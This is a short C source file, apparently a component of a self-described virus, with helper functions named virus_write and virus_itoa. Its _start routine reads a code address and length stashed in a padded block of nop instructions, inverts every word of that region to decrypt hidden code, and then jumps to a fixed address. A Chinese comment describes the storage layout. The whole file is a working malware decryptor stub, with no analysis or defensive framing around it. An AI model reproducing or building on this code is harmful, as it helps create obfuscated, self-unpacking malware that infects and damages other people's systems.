void end();
long virus_write();
char * virus_itoa();
void _start()
{
	char rr[20];
	unsigned long* addr = (unsigned long*)&end;
	unsigned long* con = (unsigned long*)*addr;
	unsigned long* size = (unsigned long*)&end+1;
	unsigned long i;
	//virus_write(1,*size,20);
	for(i=0;i<*size;i++){
		*con = ~(*con);
		con++;
		/*
		char r[2];
		virus_write(1, virus_itoa(i,r), 2);
		*/
	}
	__asm__ volatile("jmp 0x10000001");
	//virus_write(1,virus_itoa(dd,rr),20);
}
//依次存放text段地址和代码段大小
void end(){
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
}
